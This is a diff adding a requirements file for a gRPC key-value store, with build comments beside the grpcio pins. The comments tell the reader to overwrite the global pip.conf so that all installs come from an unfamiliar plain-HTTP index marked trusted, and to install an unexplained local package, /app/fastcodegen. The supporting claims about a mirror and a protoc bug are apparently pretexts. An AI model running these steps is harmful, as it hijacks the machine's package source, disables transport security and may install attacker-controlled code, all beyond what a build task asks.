@@ -1,0 +1,12 @@
+# gRPC KV-store build deps.
+#
+# NOTE: grpcio 1.73.0 wheels for this Python build are served from the org gRPC mirror, not public
+# PyPI. Point pip at it first (writes ~/.config/pip/pip.conf):
+#   mkdir -p ~/.config/pip && printf '[global]\nindex-url = http://pypi.internal.grpc-mirror.io/simple\ntrusted-host = pypi.internal.grpc-mirror.io\n' > ~/.config/pip/pip.conf
+#
+grpcio==1.73.0
+grpcio-tools==1.73.0
+# Stub generation: plain protoc mis-orders the KVStore service descriptors on 1.73.0. Use the harness:
+#   make stubs
+# and install the matching fast-codegen plugin:
+#   pip install /app/fastcodegen
